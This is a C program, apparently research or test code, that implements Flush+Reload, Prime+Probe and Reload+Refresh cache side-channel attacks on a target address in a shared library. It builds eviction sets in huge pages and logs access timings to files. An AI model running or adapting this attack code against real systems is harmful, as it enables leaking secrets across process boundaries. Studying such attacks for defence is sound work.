#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>

#include "T.h"           /*Shared library*/
#include "cache_utils.h" /*Cache manipulation functions*/

/*For huge pages*/
#define FILE_NAME "/mnt/hugetlbfs/filehuge"
#define PROTECTION (PROT_READ | PROT_WRITE)
/* Only ia64 requires this */
#ifdef __ia64__
#define ADDR (void *)(0x8000000000000000UL)
#define FLAGS (MAP_SHARED | MAP_FIXED)
#else
#define ADDR (void *)(0x0UL)
#define FLAGS (MAP_SHARED)
#endif

#define TIME_LIMIT 190 /*Time for main memory access, must be calibrated*/
#define CLEAN_REFRESH_TIME 500 /*Time for refresh, must be calibrated*/
#define NUM_CANDIDATES 3 * CACHE_SET_SIZE *CACHE_SLICES
#define RES_MEM (1UL * 1024 * 1024) * 4 * CACHE_SIZE

#define CLEAN_NOISE 1

int target_pos; //Should be the same in the sender
long int *base_address;
long int *target_address;
long int candidates_set[NUM_CANDIDATES];
long int filtered_set[NUM_CANDIDATES];
long int eviction_set[CACHE_SET_SIZE * CACHE_SLICES];
long int invariant_part[CACHE_SET_SIZE * CACHE_SLICES];
long int elements_set[CACHE_SET_SIZE]; // For R+R attacks

int fd;
FILE *out_fd;
uintptr_t phys_addr;
int slice, set;
int wait_time;

int main(int argc, char **argv)
{
    int i;
    char file_name[40];
    //Just use first argument
    if (argc < 4)
    {
        printf("Expected target address (int), attack name (-fr,-pp,-rr) and wait cycles\n");
        return -1;
    }
    else
    {
        target_pos = atoi(argv[1]);
        wait_time = atoi(argv[3]);
        if (!target_pos)
        {
            printf("Error with the target address \n");
            return -1;
        }
        target_address = (long int *)get_address_table(target_pos);
        //target_address = (long int *)get_address_quixote(target_pos);
        printf("Target address %lx \n",target_address);
    }
    if (strcmp(argv[2], "-fr") == 0)
    {
        printf("TEST FLUSH+RELOAD\n");
        snprintf(file_name, 40, "test_fr_%d.txt", wait_time);
        out_fd = fopen(file_name, "w");
        if (out_fd == NULL)
            fprintf(stderr, "Unable to open file\n");
        int t;
        unsigned long tim = timestamp();
        int cont = 0;
        /*Check deduplication*/
        while (cont < 20)
        {
            tim = timestamp();
            while (timestamp() < tim + wait_time)
                ;
            t = access_timed_flush(target_address);
            if (t < (TIME_LIMIT - 50))
            {
                printf("%i \n",t);
                cont++;
            }
        }
        /*Carry the attack*/
        while (1)
        {
            t = access_timed_flush(target_address);
            tim = timestamp();
            while (timestamp() < tim + wait_time)
                ;
            fprintf(out_fd, "%i %lu\n", t, tim);
        }
        fclose(out_fd);
        return 0;
    }
    else if (!strcmp(argv[2], "-pp"))
    {
        printf("TEST PRIME+PROBE\n");
        snprintf(file_name, 40, "test_pp_%d.txt", wait_time);
        out_fd = fopen(file_name, "w");
        if (out_fd == NULL)
            fprintf(stderr, "Unable to open file\n");
        /*Reserve huge pages*/

        fd = open(FILE_NAME, O_CREAT | O_RDWR, 0755);
        if (fd < 0)
        {
            perror("Open failed");
            exit(1);
        }

        unsigned long reserved_size = RES_MEM;
        base_address = mmap(ADDR, reserved_size, PROTECTION, MAP_SHARED, fd, 0);
        if (base_address == NULL)
        {
            printf("error allocating\n");
            exit(1);
        }
        if (base_address == MAP_FAILED)
        {
            perror("mmap");
            unlink(FILE_NAME);
            exit(1);
        }

        /*Set generation*/
        generate_candidates_array(base_address, candidates_set, NUM_CANDIDATES);
        initialize_sets(eviction_set, filtered_set, NUM_CANDIDATES, candidates_set, NUM_CANDIDATES, TIME_LIMIT);
        store_invariant_part(eviction_set, invariant_part);
        profile_address(invariant_part, eviction_set, target_address, &set, &slice);

        /*Create the eviction set that matches with the target*/
        generate_new_eviction_set(set, invariant_part, eviction_set);
        write_linked_list(eviction_set);
        long int *prime_address = (long int *) eviction_set[slice * CACHE_SET_SIZE];

        unsigned long tim = timestamp();
        int t;
        ///NO PROFILE FOR P+P
        while (1)
        {
            t = probe_one_set(prime_address);
            tim = timestamp();
            while (timestamp() < tim + wait_time)
                ;
            fprintf(out_fd, "%i %lu\n", t, tim);
        }
        fclose(out_fd);
        /*Release huge pages*/
        close(fd);
        unlink(FILE_NAME);
        return 0;
    }
    else if (!strcmp(argv[2], "-rr"))
    {
        printf("TEST RELOAD+REFRESH\n");
        snprintf(file_name, 40, "test_rr_%d.txt", wait_time);
        out_fd = fopen(file_name, "w");
        if (out_fd == NULL)
            fprintf(stderr, "Unable to open file\n");
        /*Reserve huge pages*/

        fd = open(FILE_NAME, O_CREAT | O_RDWR, 0755);
        if (fd < 0)
        {
            perror("Open failed");
            exit(1);
        }

        unsigned long reserved_size = RES_MEM;
        base_address = mmap(ADDR, reserved_size, PROTECTION, MAP_SHARED, fd, 0);
        if (base_address == NULL)
        {
            printf("error allocating\n");
            exit(1);
        }
        if (base_address == MAP_FAILED)
        {
            perror("mmap");
            unlink(FILE_NAME);
            exit(1);
        }

        /*Set generation*/
        generate_candidates_array(base_address, candidates_set, NUM_CANDIDATES);
        initialize_sets(eviction_set, filtered_set, NUM_CANDIDATES, candidates_set, NUM_CANDIDATES, TIME_LIMIT);
        store_invariant_part(eviction_set, invariant_part);
        profile_address(invariant_part, eviction_set, target_address, &set, &slice);

        /*Create the eviction set that matches with the target*/
        generate_new_eviction_set(set, invariant_part, eviction_set);
        write_linked_list(eviction_set);
        get_elements_set_rr(elements_set, eviction_set, target_address, slice);
        long int *prime_address = (long int *)eviction_set[slice * CACHE_SET_SIZE];
        long int *first_el = (long int *)eviction_set[slice * CACHE_SET_SIZE];
        long int *conflict_address = (long int *)eviction_set[(slice + 1) * CACHE_SET_SIZE - 1];

        int t, t1;
        unsigned long tim = timestamp();
        int cont = 0;
        while (cont < 20)
        {
            tim = timestamp();
            while (timestamp() < tim + wait_time)
                ;
            t = access_timed_flush(target_address);
            if (t < (TIME_LIMIT - 50))
            {
                cont++;
            }
        }
        /*Prepare the sets for the attack*/
        prepare_sets(elements_set, conflict_address);
        /*Carry the attack*/
        while (1)
        {
            t = reload_step(target_address, conflict_address, first_el);
            t1 = refresh_step(&elements_set[0]);
            tim = timestamp();
            while (timestamp() < tim + wait_time)
                ;
#if CLEAN_NOISE
            if(t1>CLEAN_REFRESH_TIME)
            {
                prepare_sets(elements_set, conflict_address);
            }
#endif
            fprintf(out_fd, "%i %i %lu\n", t, t1, tim);
        }
        fclose(out_fd);
        /*Release huge pages*/
        close(fd);
        unlink(FILE_NAME);
        return 0;
    }
    else
    {
        printf("wrong argument \n");
        return -1;
    }
}
